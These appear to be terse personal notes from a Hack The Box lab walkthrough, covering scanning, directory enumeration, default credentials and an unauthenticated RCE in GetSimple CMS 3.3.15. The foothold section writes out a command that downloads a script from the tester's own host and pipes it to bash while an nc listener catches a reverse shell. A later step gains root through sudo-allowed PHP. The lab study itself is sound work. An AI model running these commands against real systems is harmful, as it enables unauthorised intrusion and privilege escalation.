Ports Scanning!!!
```sh
rustscan -a 10.129.250.167
echo '10.129.250.167   gettingstarted.htb' >> /etc/hosts
```
![[Pasted image 20250524132046.png]]
- [ ] FootPrinting And Enumeration
Port 80!!!!!
![[Pasted image 20250524132701.png]]
```sh
dirsearch -u http://gettingstarted.htb/
```
![[Pasted image 20250524132729.png]]
![[Pasted image 20250524132758.png]]
```
[+] GetSimple CMS
[+] Defaults admin creds admin:admin
```
![[Pasted image 20250524132917.png]]
```
GetSimple CMS Version 3.3.15
https://github.com/cybersecaware/GetSimpleCMS-RCE
Unauthenticated RCE
```
![[Pasted image 20250524134107.png]]

- [ ] FootHold
```sh
curl 10.10.14.230/b.sh|bash
nc -lvnp 443
```
![[Pasted image 20250524134314.png]]

- [ ] Priv Escalation
```sh
sudo -l
```
![[Pasted image 20250524134837.png]]
```sh
CMD="/bin/bash"
sudo /usr/bin/php -r "system('$CMD');"
```
![[Pasted image 20250524135006.png]]
- [ ] FootHold Details!!!
![[Pasted image 20250524140211.png]]
![[Pasted image 20250524140732.png]]
![[Pasted image 20250524140751.png]]
```
http://gettingstarted.htb/theme/Innovation/template.php
```

